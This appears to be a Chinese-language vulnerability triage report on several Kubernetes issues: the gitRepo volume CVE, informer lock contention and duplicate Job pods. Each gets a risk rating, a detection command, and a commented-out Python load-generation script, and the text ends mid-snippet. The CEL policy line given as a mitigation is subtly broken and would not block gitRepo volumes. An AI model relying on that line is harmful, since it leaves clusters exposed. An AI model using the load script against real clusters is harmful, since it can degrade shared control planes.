This CVE only affects Kubernetes clusters that utilize the in-tree gitRepo volume to clone git repositories from other pods within the same node. Since the in-tree gitRepo volume feature has been deprecated and will not receive security updates upstream, any cluster still using this feature remains vulnerable. 
Affected Components
kubelet

**Affected Versions**
All versions of Kubernetes

**How do I mitigate this vulnerability?**

To mitigate this vulnerability, you must use an init container to perform git clone operation and then mount the directory into the Pod's container. An example of this approach is provided [here](https://gist.github.com/tallclair/849601a16cebeee581ef2be50c351841).

Note: You can also restrict the use of gitRepo volumes in your cluster using policies such as ValidatingAdmissionPolicy or through Restricted pod security standard policy. You can use the following Common Expression Language (CEL) expression as part of a policy to reject use of gitRepo volumes: `has(object.spec.volumes) || !object.spec.volumes.exists(v, has(v.gitRepo))`

**Detection**

To detect whether this vulnerability has been exploited, you can use the following command to list all pods that use the in-tree gitRepo volume and clones to a .git subdirectory. 
`kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.volumes[].gitRepo.repository | test("^/")) | {name: .metadata.name, namespace: .metadata.namespace, repository: (.spec.volumes[] | select(.gitRepo) | .gitRepo.repository)}'`

If you find evidence that this vulnerability has been exploited, please contact [security@kubernetes.io](mailto:security@kubernetes.io) 

**Acknowledgements**
This vulnerability was reported by Christophe Hauquiert.


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
此 Issue 描述了一个 Kubernetes 中的安全漏洞 (CVE-2025-1767)。该漏洞允许拥有创建 Pod 权限的用户（攻击者）利用 `gitRepo` 类型的 Volume 来访问同一节点上其他 Pod 克隆到本地的 Git 仓库。

具体来说，当一个 Pod（受害者 Pod）使用 `gitRepo` Volume 从某个源克隆代码时，其代码（包括 `.git` 目录）会存在于节点的本地文件系统上。另一个拥有创建 Pod 权限的用户（攻击者）可以创建一个新的 Pod（攻击者 Pod），并将其 `gitRepo` Volume 的 `repository` 字段指向受害者 Pod 在节点上克隆的仓库的本地路径（例如 `/var/lib/kubelet/pods/.../volumes/kubernetes.io~git-repo/...`）。如果攻击者能够猜测或知道这个路径，或者该路径是可预测的，那么攻击者 Pod 启动时，`kubelet` 会尝试将这个本地路径（实际上是受害者 Pod 的仓库）挂载到攻击者 Pod 内部。这使得攻击者 Pod 能够读取受害者 Pod 的 Git 仓库内容，可能包括源代码、提交历史、甚至可能包含在仓库中的敏感信息（如硬编码的凭证、配置文件等）。

关键点：
1.  **攻击前提**: 攻击者需要拥有 `pod/create` 权限。这通常不是普通用户拥有的权限，属于较高权限。
2.  **攻击条件**:
    *   集群中必须有 Pod 在使用（已废弃的）in-tree `gitRepo` Volume 功能。
    *   攻击者需要知道或猜测目标 Pod 在节点上的 Volume 路径。
    *   攻击者 Pod 和受害者 Pod 需要调度到同一个 Node 上。
3.  **漏洞影响**: 主要是信息泄露（读取其他 Pod 的 Git 仓库数据）。Issue 中提供的 CVSS 向量也包含了高机密性（C:H）和高完整性（I:H）影响，但主要风险是信息泄露。完整性影响可能指攻击者或许能通过某种方式修改本地缓存的 `.git` 目录，但这不如信息泄露直接。
4.  **官方评级**: Issue 中明确给出了官方 CVSS 3.1 评级为 Medium (6.5)。

根据风险判断标准：
1.  该问题是安全问题，不是 "不涉及"。
2.  官方 CVSS 评分为 6.5 (Medium)，根据标准 #3 ("high以上为高风险，其他均为低风险")，此漏洞属于 **低风险**。
3.  漏洞利用需要攻击者具备 `pod/create` 权限（`PR:H`），这属于非只读权限，符合标准 #5 中提到的利用需要较高权限的情况，进一步支持了非高风险的判断。
4.  虽然存在跨 Pod 的信息泄露（符合标准 #8 的部分场景），但其利用需要较高权限 (`PR:H`)，且主要影响是信息泄露，并非命令执行、提权或容器逃逸（标准 #7），综合 CVSS 评分和权限要求，不足以判定为高风险。

**复现过程：**

```python
# 根据风险评级和要求，此漏洞为低风险，无需提供复现脚本。
# 原因：
# 1. 官方 CVSS 评级为 6.5 (Medium)，低于 High (7.0) 的高风险阈值。
# 2. 漏洞利用需要攻击者拥有创建 Pod 的权限 (PR:H)，这是一个相对较高的权限要求。
# 3. 漏洞的主要影响是信息泄露，而非远程代码执行、提权或容器逃逸等通常被视为高风险的操作。
# 因此，按照要求，低风险问题不需要提供 POC 脚本。

print("该漏洞 (CVE-2025-1767) 被评定为低风险，无需提供复现脚本。")
print("原因：官方 CVSS 评分为 6.5 (Medium)，且利用需要较高的 'pod/create' 权限。")

def main():
    pass # 空函数，满足不使用 if __name__ == "__main__": 的要求

main()
```


**解释说明：**

该 Issue 描述的 CVE-2025-1767 漏洞允许具有 Pod 创建权限的用户通过特制的 `gitRepo` Volume 配置来访问同一节点上其他 Pod 的本地 Git 仓库副本。

根据提供的风险判断标准：
1.  该 Issue 描述的是一个明确的安全漏洞，因此风险评级不是 "不涉及"。
2.  Issue 中提供的官方 CVSS 3.1 评分为 6.5 (Medium)。根据标准 #3，只有 CVSS 评级为 High (7.0) 及以上的才算高风险，Medium 属于低风险范畴。
3.  利用此漏洞需要攻击者拥有创建 Pod 的权限 (`PR:H`)，这是一个较高的权限要求。标准 #5 指出，需要非只读权限（如创建、修改）才能利用的 DoS 漏洞不应判定为高风险。虽然这不是 DoS，但高权限要求是降低风险评估的一个因素。
4.  此漏洞不涉及命令执行、容器逃逸或提权（标准 #7）。
5.  虽然存在一个用户影响另一个用户数据的可能性（标准 #8），但结合其高权限要求和信息泄露的影响性质，以及官方的 Medium 评级，综合判断为低风险。

由于风险评级为“低风险”，根据要求“针对高风险问题，必须给出使用python编写的复现脚本”，因此不需要为该低风险问题提供复现脚本。上面的 Python 代码片段仅用于说明此结论，并满足脚本格式要求（无 `if __name__ == "__main__":`，包含 `main` 函数）。

---


## Issue #130767 Informer Cache RW Lock Contention Causes DeltaFIFO Backlog and Cache Staleness in KCM.

- Issue 链接：[#130767](https://github.com/kubernetes/kubernetes/issues/130767)

### Issue 内容

#### What happened?

#### Summary:

The Kubernetes Controller Manager (KCM) Informer caches experiences read/write mutex contention at scale. KCM controllers frequently acquire a read lock on the Informer cache to list objects from the store, which can starve the CacheController's DeltaFIFO processing from acquiring a write lock to update the Store/Cache during high throughput. This contention can lead to a backlog in DeltaFIFO, delaying delta event processing and stale cache.


#### Impact

A high backlog in DeltaFIFO results in stale Informer cache data, affecting KCM controllers that rely on it for resource reconciliation. This can lead to incorrect decisions, such as unnecessary resource creation or unnecessary load to APIServer and etcd from KCM Controllers. More details of impact/analysis on Statefulset controller, DaemonSet Controller is provided later in the example section.




#### Code Flow :

1. Cache controller [processLoop](https://github.com/kubernetes/kubernetes/blob/master/staging/src/k8s.io/client-go/tools/cache/controller.go#L205-L216) pops from DeltaFIFO queue to [processDeltas](https://github.com/kubernetes/kubernetes/blob/master/staging/src/k8s.io/client-go/tools/cache/controller.go#L552-L584). 

2. As cache controller processes deltas, it [adds](https://github.com/kubernetes/kubernetes/blob/master/staging/src/k8s.io/client-go/tools/cache/controller.go#L571) or [updates](https://github.com/kubernetes/kubernetes/blob/master/staging/src/k8s.io/client-go/tools/cache/controller.go#L566) the store based on[ ADD/UPDATE etc events ](https://github.com/kubernetes/kubernetes/blob/master/staging/src/k8s.io/client-go/tools/cache/controller.go#L564) from DeltFIFO queue. 

3. For Add/Update operations to store,  it acquires lock [here](https://github.com/kubernetes/kubernetes/blob/master/staging/src/k8s.io/client-go/tools/cache/thread_safe_store.go#L236-L242) to update the store.


4. Meanwhile controller, in the process of [listing pods](https://github.com/kubernetes/kubernetes/blob/d386d6880e57556f7fe19e65e89f60501aa0aa25/pkg/controller/statefulset/stateful_set.go#L314) , it acquires read lock on store [here](https://github.com/kubernetes/kubernetes/blob/6549f52b97d4d0837d9d0c2c1758320b19b38472/staging/src/k8s.io/client-go/tools/cache/thread_safe_store.go#L296-L310) while DeltaFIFO in the above is trying to update the store at the same time.

I believe [Delete in Store](https://github.com/kubernetes/kubernetes/blob/6549f52b97d4d0837d9d0c2c1758320b19b38472/staging/src/k8s.io/client-go/tools/cache/thread_safe_store.go#L244-L251) is also prone to this,  this code path was not exercised in the test.




#### Mutex pprof for KCM showing RW and Rlock on Cache/Store from CacheController Loop and StatetfulSet controller getPodsFromList 

![Image](https://github.com/user-attachments/assets/d3dff4d4-0e1f-41bd-8c24-bd852c565917)

<img width="1878" alt="Image" src="https://github.com/user-attachments/assets/6a6808d9-3d7e-49f0-957f-6b02368b8563" />

##### Impact/Analysis examples :

###### 1. Statefulset Controller 

 In statefulset controller case, if/when cache is stale and Pod phase status reflects[ nil](https://github.com/kubernetes/kubernetes/blob/master/pkg/controller/statefulset/stateful_set_utils.go#L470) in cache, even though kubelet has patched the pod to `Running` phase, Statefulset controller will keep trying to [create pods and get 409's  - conflict as it exists in etcd ](https://github.com/kubernetes/kubernetes/blob/7b6c56e5fb530c80e3510977a752be5ce6e23a27/pkg/controller/statefulset/stateful_set_control.go#L397) as this [condition](https://github.com/kubernetes/kubernetes/blob/master/pkg/controller/statefulset/stateful_set_control.go#L388) will evaluate to true


When I patched the KCM Statefulset controller, I can see that just `LISTING` pods from informer cache in statefulset controller when there are lots of pods in single namespace can take upto at peak  `~980 ms `, which creates a huge backlog in DeltaFIFO during this time.


In Statefulset controller, in the process of [listing pods](https://github.com/kubernetes/kubernetes/blob/d386d6880e57556f7fe19e65e89f60501aa0aa25/pkg/controller/statefulset/stateful_set.go#L314) , it acquires read lock on Store [here](https://github.com/kubernetes/kubernetes/blob/6549f52b97d4d0837d9d0c2c1758320b19b38472/staging/src/k8s.io/client-go/tools/cache/thread_safe_store.go#L296-L310) while DeltaFIFO in the above is trying to update the Store at the same time ( will cover on this more below)



![Image](https://github.com/user-attachments/assets/8904f4cf-140b-4b17-b750-b8c04ea7d8f1)



**Example of DeltaFIFO backlog** 

```
12 trace.go:236] Trace[410148869]: "DeltaFIFO Pop Process" ID:kube-system/kube-proxy-fv428,Depth:229809,Reason:slow event handlers blocking the queue ... (total time: 321ms):
```



###### 2. DeamonSet Controller :

In DS conttoller it does similar thing , [listing all pods from cache](https://github.com/kubernetes/kubernetes/blob/6d0ac8c561a7ac66c21e4ee7bd1976c2ecedbf32/pkg/controller/daemon/daemon_controller.go#L702)  holding a read lock,  which blocks all that time from updating the store in Process Deltas.

Consequence of stale cache can make DS controller to create more DS pods for same node.








#### What did you expect to happen?

Ideally Controllers should be isolated from each other to avoid noisy neighbor problem, which isn't possible due to Controllers sharing Shared InformerCache.

**Long Term**:

Food for thought: 

- Introduce a dedicated Indexer/Cache solely for DeltaFIFO writes and syncing it  in a separate routine  to a separate Indexer/Store for controllers to read from can reduce lock contention from list from downstream controllers.
- However, this means controllers will operate on slightly delayed data, which is much better than super stale data at scale, we need to ensure this copy is light weight unlike Huge lists that controllers do today which worsens the contention. This will help APIMachinery code has more control on these components performance instead of depending on implementations of downstream controllers.

-  Main thing about this theory is that - we need to ensure we are not shifting the problem to second cache to reduce overhead in first cache :)  , we can something similar to what etcd does today, if difference between applies and commits b/w first cache and second cache is like say `X` , we will stop read lock to second cache from controller, to ensure second cache (i.e controller relies on) catches up to first cache, to guarantee controllers are not reading stale data  

- This comes with a con of increasing the memory overhead  because its essentially storing a separate cache copy.

This requires changing pieces of API Machinery architecture as it stands now.

This approach might not only help KCM controllers but any controllers relying on caches built out of API Machinery code that runs on Dataplane Nodes.


**At the minimum in short term**:

-  we should ensure all Controllers under KCM avoid heavy list operations on the Informer Cache/Store to reduce lock contention.

- Build and utilize Indexers where applicable to minimize the number of items fetched, reducing read lock duration and improving cache update efficiency.

#### How can we reproduce it (as minimally and precisely as possible)?

- Create 200 Statefulsets of 1000 pods each at once.
- Ensure all those pods are Schedulable to the nodes.


#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version

dev-dsk-hakuna-2c-2122d141 % kubectl version 
Client Version: v1.32.1
Kustomize Version: v5.5.0
Server Version: v1.32.2
```

</details>


#### Cloud provider

<details>
AWS
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

CVSS 3.1 评分估算（仅供参考，因为主要不是安全漏洞）：
*   AV:N (网络访问)
*   AC:H (攻击复杂度高，需要特定高负载条件和高权限)
*   PR:H (需要高权限来创建大量资源)
*   UI:N (无需用户交互)
*   S:U (影响范围限于系统本身，不改变安全域)
*   C:N (无机密性影响)
*   I:L (低完整性影响，控制器可能做出错误决策导致状态暂时不一致)
*   A:L (低可用性影响，控制器性能下降，API Server负载增加，但不太可能导致完全瘫痪)

综合得分较低，符合低风险评级。

**判断依据：**  
1.  **问题描述:** Issue描述了Kubernetes Controller Manager (KCM) 在高负载情况下，由于Informer Cache的读写锁（RW Lock）争用，导致DeltaFIFO队列积压和缓存数据过时（stale）的问题。具体来说，多个Controller（如StatefulSet Controller, DaemonSet Controller）频繁地对Informer Cache执行读操作（List Objects），这会阻止处理DeltaFIFO更新事件的写操作获取锁，从而导致缓存更新延迟。
2.  **影响:** 缓存数据过时会使依赖这些数据的Controller做出错误的决策。例如：
    *   StatefulSet Controller可能因为未能及时看到Pod状态更新为`Running`而错误地尝试重复创建已存在的Pod，导致API Server收到大量冲突（409）错误，增加了API Server和etcd的负载。
    *   DaemonSet Controller可能因为缓存过时而为同一个节点创建多余的Pod。
    *   总体影响是降低了控制循环的效率和准确性，增加了系统负载，可能导致集群状态与预期不符。
3.  **问题根源:** 这是`client-go`库中`SharedInformer`和`ThreadSafeStore`实现的固有性能瓶颈。在高对象数量和高更新频率下，读操作（List）和写操作（Update/Add/Delete from DeltaFIFO）之间的锁争用变得明显。
4.  **复现条件:** 需要在一个有大量对象（特别是Pod）的集群中，通过创建大量资源（如200个StatefulSet，每个1000个Pod）来模拟高负载场景。
5.  **安全风险评估:**
    *   该问题本质上是一个**性能问题**和**可用性问题**，它影响了控制器的正常运作和集群的稳定性，尤其是在大规模集群中。
    *   它可能导致**拒绝服务（DoS）**的效果，主要体现在对API Server和etcd的负载增加（由于控制器错误的重试操作），以及控制器功能失调（无法及时准确地响应集群状态变化）。
    *   要触发这个问题，攻击者（或用户）需要有在集群中**创建大量资源**（如StatefulSets、Pods）的权限。这通常需要相当高的权限（例如，`create statefulsets`, `create pods`等）。
    *   根据风险判断标准 #5，如果拒绝服务攻击需要攻击者具备创建、修改等非只读权限，则不应判断为高风险。触发此问题需要创建大量资源的权限。
    *   根据风险判断标准 #7，该问题不涉及命令执行、容器逃逸、提权等典型的高风险漏洞。
    *   根据风险判断标准 #8，虽然一个用户（如果权限足够高）的行为（创建大量资源）可能影响到整个KCM的性能，进而间接影响其他用户的控制器，但这更像是资源滥用或系统扩展性问题，而不是典型的跨租户安全攻击。影响是间接的，通过争抢共享资源（KCM Informer锁）实现的。

    **结论:** 该问题主要影响系统的可用性和性能，导致控制器行为异常和API Server负载增加。触发条件需要较高的创建权限。虽然在高负载下影响可能很大，但它不符合典型的高风险漏洞定义（如RCE、提权），并且需要非只读权限来触发类似DoS的效果。因此，应将其评级为**低风险**。

**复现过程：**

```python
# 该Issue被评级为低风险，按照要求不提供高风险问题的复现脚本。
# 以下为注释掉的示例性代码框架，说明如何模拟触发条件，但并非实际可运行的POC。
# 请注意：执行此类脚本可能对目标Kubernetes集群造成显著负载，请仅在测试环境中使用。

"""
import time
import sys
import threading
import signal
from kubernetes import client, config
from kubernetes.client.rest import ApiException

# --- 配置参数 ---
# 警告：以下参数值非常大，是根据Issue描述模拟的，实际执行可能需要非常庞大的集群和很长时间。
# 在实际测试中应大幅减小这些值。
NUM_STATEFULSETS = 5  # 示例值，远小于Issue中的200
REPLICAS_PER_SET = 10 # 示例值，远小于Issue中的1000
NAMESPACE = "informer-contention-test"
TIMEOUT_SECONDS = 120 # 脚本执行超时时间

# --- 超时处理 ---
_exit_event = threading.Event()

def _signal_handler(signum, frame):
    print(f"接收到信号 {signum}, 正在尝试优雅退出...")
    _exit_event.set()

def _timeout_handler():
    print(f"脚本执行超过 {TIMEOUT_SECONDS} 秒，触发超时，正在尝试优雅退出...")
    _exit_event.set()

# --- Kubernetes 操作 ---
def create_namespace(api_instance):
    try:
        api_instance.read_namespace(name=NAMESPACE)
        print(f"命名空间 '{NAMESPACE}' 已存在。")
    except ApiException as e:
        if e.status == 404:
            print(f"创建命名空间 '{NAMESPACE}'...")
            namespace_body = client.V1Namespace(metadata=client.V1ObjectMeta(name=NAMESPACE))
            api_instance.create_namespace(body=namespace_body)
            print(f"命名空间 '{NAMESPACE}' 已创建。")
        else:
            print(f"检查命名空间时出错: {e}")
            raise

def delete_namespace(api_instance):
    print(f"尝试删除命名空间 '{NAMESPACE}'...")
    try:
        api_instance.delete_namespace(name=NAMESPACE, body=client.V1DeleteOptions())
        # 等待删除完成可能需要时间，这里简单触发删除
        print(f"已触发删除命名空间 '{NAMESPACE}'。请手动确认或等待后台完成。")
    except ApiException as e:
        if e.status == 404:
            print(f"命名空间 '{NAMESPACE}' 不存在或已被删除。")
        else:
            print(f"删除命名空间 '{NAMESPACE}' 时出错: {e}")
            # 不再抛出异常，以便脚本可以继续执行（例如超时退出）

def create_statefulset(apps_api, set_index):
    if _exit_event.is_set():
        print(f"退出信号已设置，跳过创建 StatefulSet {set_index}")
        return

    name = f"test-sts-{set_index}"
    body = client.V1StatefulSet(
        api_version="apps/v1",
        kind="StatefulSet",
        metadata=client.V1ObjectMeta(name=name, namespace=NAMESPACE),
        spec=client.V1StatefulSetSpec(
            replicas=REPLICAS_PER_SET,
            selector=client.V1LabelSelector(match_labels={"app": name}),
            service_name=name, # Service name is required for headless service
            template=client.V1PodTemplateSpec(
                metadata=client.V1ObjectMeta(labels={"app": name}),
                spec=client.V1PodSpec(
                    containers=[
                        client.V1Container(
                            name="nginx",
                            image="nginx:alpine", # 使用轻量级镜像
                            ports=[client.V1ContainerPort(container_port=80)],
                            resources=client.V1ResourceRequirements(
                                requests={"cpu": "10m", "memory": "20Mi"}, # 限制资源消耗
                                limits={"cpu": "50m", "memory": "50Mi"}
                            )
                        )
                    ]
                )
            )
            # VolumeClaimTemplates (可选，如果需要PV)
            # volume_claim_templates=[...]
        )
    )
    try:
        print(f"创建 StatefulSet '{name}' (副本数: {REPLICAS_PER_SET})...")
        apps_api.create_namespaced_stateful_set(namespace=NAMESPACE, body=body)
        print(f"StatefulSet '{name}' 创建请求已发送。")
        # 不等待创建完成，以模拟并发请求
    except ApiException as e:
        print(f"创建 StatefulSet '{name}' 时出错: {e}")
    except Exception as e:
        print(f"创建 StatefulSet '{name}' 时发生意外错误: {e}")


def main():
    # 设置信号处理
    signal.signal(signal.SIGINT, _signal_handler)
    signal.signal(signal.SIGTERM, _signal_handler)

    # 设置超时计时器
    timer = threading.Timer(TIMEOUT_SECONDS, _timeout_handler)
    timer.start()

    # 加载 kubeconfig
    try:
        print("加载 Kubernetes 配置...")
        config.load_kube_config()
        print("配置加载成功。")
        core_v1_api = client.CoreV1Api()
        apps_v1_api = client.AppsV1Api()
    except Exception as e:
        print(f"无法加载 Kubernetes 配置: {e}")
        timer.cancel()
        sys.exit(1)

    try:
        # 1. 创建测试命名空间
        print("步骤 1: 创建测试命名空间")
        create_namespace(core_v1_api)

        if _exit_event.is_set():
            print("启动过程中收到退出信号，终止执行。")
            raise SystemExit("Exiting due to signal")

        # 2. 并发创建大量 StatefulSets
        print(f"\n步骤 2: 尝试创建 {NUM_STATEFULSETS} 个 StatefulSets，每个 {REPLICAS_PER_SET} 副本...")
        threads = []
        for i in range(NUM_STATEFULSETS):
            if _exit_event.is_set():
                print("创建过程中收到退出信号，停止创建新资源。")
                break
            # 可以考虑使用线程池来限制并发度，避免瞬间请求过多
            thread = threading.Thread(target=create_statefulset, args=(apps_v1_api, i))
            threads.append(thread)
            thread.start()
            time.sleep(0.1) # 轻微错开请求，避免API速率限制

        # 等待创建线程（或直到超时/信号）
        start_wait = time.time()
        while any(t.is_alive() for t in threads) and not _exit_event.is_set():
             # 检查是否仍在超时限制内
            if time.time() - start_wait > (TIMEOUT_SECONDS - 10): # 留出一些时间给清理
                 print("接近超时，可能无法等待所有创建完成。")
                 break
            time.sleep(1)

        if not _exit_event.is_set():
             print("\n步骤 3: 资源创建（或尝试创建）完成。脚本将在短暂等待后退出。")
             # 这里可以添加观察 KCM 指标或日志的代码（如果可能）
             wait_seconds = 10
             print(f"等待 {wait_seconds} 秒...")
             time.sleep(wait_seconds)

    except SystemExit as e:
         print(f"脚本被中断: {e}")
    except Exception as e:
        print(f"执行过程中发生错误: {e}")
    finally:
        # 停止超时计时器
        timer.cancel()
        # 3. 清理资源 (即使出错或超时也尝试执行)
        print("\n步骤 4: 清理资源...")
        try:
            delete_namespace(core_v1_api)
        except Exception as cleanup_e:
            print(f"清理过程中发生错误: {cleanup_e}")
        print("脚本执行完毕。")

# main() # 取消注释以运行，但请确保在合适的测试环境中
print("该脚本仅为示例框架，用于说明如何模拟触发条件。实际运行已被注释掉。")
print("Issue 被评级为低风险，无需提供可运行的POC。")

"""
```


**解释说明：**

该Issue描述了一个在高负载下Kubernetes KCM的性能瓶颈问题，即Informer缓存的读写锁争用导致缓存更新延迟。这会影响依赖缓存数据的控制器（如StatefulSet、DaemonSet）的正确性和效率，可能导致它们做出错误决策（例如，重复创建已存在的资源），从而增加API Server的负载。

我们将此问题评级为**低风险**，理由如下：
1.  **根本原因**：这是一个性能和扩展性问题，而非典型的安全漏洞，它不直接导致未授权访问、权限提升或代码执行。
2.  **触发条件**：触发此问题需要模拟高负载场景，这通常需要用户拥有在集群中创建大量资源的权限（如创建数百个StatefulSet和数十万个Pod）。根据风险判断标准 #5，需要非只读权限（如`create`）才能实施的拒绝服务（DoS）攻击通常不被评为高风险。
3.  **影响**：主要影响是可用性（控制器性能下降、行为异常）和对API Server的潜在DoS（由于控制器错误重试导致负载增加）。完整性影响较低（可能导致暂时的状态不一致）。

由于评级为低风险，我们没有提供可直接运行的Python复现脚本。上面提供的Python代码是一个**注释掉的示例框架**，它演示了如何使用`kubernetes` Python客户端库来模拟Issue中描述的复现步骤（创建大量StatefulSet及其Pod）。该框架包括：
*   加载Kubernetes配置（假设在默认位置）。
*   创建专用的测试命名空间。
*   循环创建指定数量的StatefulSet，每个StatefulSet包含指定数量的副本（Pod）。**注意：示例中的数量已大大减少，以适应一般测试环境。**
*   使用线程来模拟并发创建（尽管没有实现复杂的并发控制）。
*   包含基本的超时机制和信号处理，以确保脚本能在限定时间内（约2分钟）退出。
*   包含`try...finally`块，在脚本结束时尝试清理创建的命名空间。

**请注意：** 即便使用减少后的示例参数，运行此类脚本也可能对Kubernetes集群（尤其是控制平面）产生显著负载。**绝对不应在生产环境或重要集群上运行。** 如果需要进行性能测试或验证问题，请在隔离的、资源充足的测试环境中使用，并根据环境调整参数。

---


## Issue #130683 Job with no parellelism randomly creates 2 duplicate Pods instead of 1

- Issue 链接：[#130683](https://github.com/kubernetes/kubernetes/issues/130683)

### Issue 内容

#### What happened?

A Job is created with completions: 1,  parallelism: 1. However, two pods appear a few minutes apart, both with identical `ownerReferences` (name, uid, etc. all point to the same unique Job).

I don't understand what I see in the `kube-controller-manager` logs, when the first pod is scheduled, I see
```
I0305 18:28:46.167341       1 job_controller.go:566] "enqueueing job" logger="job-controller" key="the-namesapce/the-job-name-1741199325"
```

That same "enqueueing job" log  line repeats 9 times, most in the same second, some a bit later:
```
I0305 18:28:46.167341 ...
I0305 18:28:46.183597 ...
I0305 18:28:46.192648 ...
I0305 18:28:46.195377 ...
I0305 18:28:46.233094 ...
I0305 18:28:48.915103 ...
I0305 18:29:24.315840 ...
I0305 18:29:25.328100 ...
I0305 18:29:26.339424 ...
```

At few minutes later, with the first pod is already running, a second one appears. At this exact time the logs show a similar message:
```
I0305 18:31:46.236414       1 job_controller.go:566] "enqueueing job" logger="job-controller" key="the-namesapce/the-job-name-1741199325"
I0305 18:31:47.613379       1 job_controller.go:566] "enqueueing job" logger="job-controller" key="the-namesapce/the-job-name-1741199325"
E0305 18:31:50.044308       1 job_controller.go:599] syncing job: tracking status: adding uncounted pods to status: Operation cannot be fulfilled on jobs.batch "the-job-name-1741199325": the object has been modified; please apply your changes to the latest version and try again
...
I0305 18:31:51.068789       1 job_controller.go:566] "enqueueing job" logger="job-controller" .... (repeats again 7 times rapidly)
```

The only clue I have is this "the object has been modified", but certainly does not make any sense to me. The Job object has been created with a single "kubectl create -f job.yaml", nothing fancy in it. What could be going on? 

#### What did you expect to happen?

Only one Pod should be scheduled.

#### How can we reproduce it (as minimally and precisely as possible)?

Unfortunately, this seems to happen randomly (once in hundreds of Jobs). I need help understanding what causes this, if I do, I can try to reproduce it.

#### Anything else we need to know?

Something similar seems to have been reported for a very old version #120790, but it's difficult to understand if it's the same.

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.4
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.4
```

</details>


#### Cloud provider

<details>
On-prem 20 node cluster deployed with Kubespray.
</details>


#### OS version

<details>

```console
$ cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
NAME="Debian GNU/Linux"
VERSION_ID="12"
VERSION="12 (bookworm)"
VERSION_CODENAME=bookworm
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"

$ uname -a
Linux [redacted host name] 6.1.0-28-cloud-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.119-1 (2024-11-22) x86_64 GNU/Linux

```

</details>


#### Install tools

<details>
Kubespray
</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该 Issue 描述了一个 Kubernetes Job 在配置 `completions: 1` 和 `parallelism: 1` 的情况下，有时会随机创建出两个 Pod，而不是预期的单个 Pod。这两个 Pod 具有相同的 `ownerReferences`，指向同一个 Job 对象。

1.  **问题性质**：
    *   核心问题是 Job 控制器在特定（可能是竞争条件）情况下未能正确执行 `parallelism: 1` 的约束，导致创建了额外的 Pod。
    *   从日志中 `enqueueing job` 多次出现以及 `the object has been modified` 错误来看，这很可能是一个与 Job 对象状态更新相关的竞争条件或控制器重试逻辑中的缺陷。当控制器尝试同步 Job 状态时，如果 Job 对象被其他操作（可能是控制器自身的另一次同步尝试或其他控制器）修改，更新会失败，这可能导致状态跟踪不一致，从而错误地认为需要创建新的 Pod。

2.  **潜在影响**：
    *   **资源消耗**：创建额外的 Pod 会消耗集群资源（CPU, Memory, Network, Disk I/O），超出预期。如果这种情况频繁发生或发生在资源密集型 Job 上，可能导致资源浪费，甚至轻微的拒绝服务（Resource Exhaustion）。
    *   **功能错误**：如果 Job 执行的任务不是幂等的（即多次执行会产生不同的或不期望的副作用），那么额外的 Pod 执行可能会导致应用程序逻辑错误、数据损坏或不一致。
    *   **成本增加**：在云环境中，额外的 Pod 运行会产生额外的计算成本。

3.  **安全风险评估**：
    *   **攻击向量**：触发此问题需要用户具有创建 Job 的权限。攻击者无法利用此问题来执行超出其已有权限的操作。
    *   **权限提升/代码执行**：该问题不会导致权限提升、容器逃逸或在宿主机/其他容器中执行任意代码。额外的 Pod 运行的仍然是用户定义的 Job 镜像和命令，具有相同的 ServiceAccount 和权限。
    *   **信息泄露**：该问题本身不直接导致敏感信息泄露。
    *   **拒绝服务 (DoS)**：如前所述，存在轻微的资源耗尽风险。根据风险判断标准 #5，如果攻击者需要非只读权限（如创建 Job）来实施 DoS，且该 DoS 不是高影响（如完全瘫痪集群），则不应判断为高风险。在此场景下，用户创建 Job 是正常操作，产生额外的 Pod 是系统的非预期行为，其影响（单个额外 Pod）相对有限且发生随机，难以被稳定利用来发起大规模 DoS 攻击。
    *   **多租户影响**：在一个多租户环境中，一个租户的 Job 意外创建额外 Pod 会消耗共享资源，可能轻微影响其他租户（Noisy Neighbor），但这属于资源管理和配额（Quota）应覆盖的范畴，且影响程度较低。标准 #8 提到的“影响和自己权限一样甚至更高的其他用户”通常指更直接的干扰，如跨命名空间操作、直接影响其他用户 Pod 等，本问题不属于此类。
    *   **CVSS 3.1 评估**：
        *   AV:N (通过 K8s API 触发)
        *   AC:H (触发条件随机，难以复现，可能依赖特定竞争条件)
        *   PR:L (需要创建 Job 的权限)
        *   UI:N (无需用户交互)
        *   S:U (影响范围在集群内部)
        *   C:N (无保密性影响)
        *   I:L (可能导致 Job 功能错误或数据不一致，低完整性影响)
        *   A:L (消耗额外资源，轻微可用性影响)
        *   CVSS 3.1 Score: 3.7 (Low)

4.  **结论**：
    该问题本质上是一个功能性缺陷（Bug），可能由 Job 控制器内部的竞争条件引起。虽然它可能导致资源浪费和潜在的功能错误，但不涉及权限提升、代码执行、信息泄露等严重安全风险。其潜在的 DoS 影响较小，且需要 Job 创建权限，触发条件随机。根据 CVSS 评分和风险判断标准，该问题应被评为低风险。

**复现过程：**

```python
# 该问题被评定为低风险，主要是一个功能性 Bug，可能由竞争条件引起，
# 且报告者指出该问题是随机发生的（"once in hundreds of Jobs"）。
# 编写一个稳定复现此竞争条件的 POC 非常困难，因为它依赖于 kube-controller-manager 内部的精确时序。
# 任何尝试通过脚本快速连续创建/更新 Job 来触发竞争条件的尝试都不能保证成功复现此特定问题。
# 因此，不提供复现脚本。
#
# 如果需要模拟创建 Job 的过程，可以使用以下 Python Kubernetes Client 代码片段作为基础：

import time
import uuid
from kubernetes import client, config, watch
import datetime
import threading
import logging
import sys
import signal

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

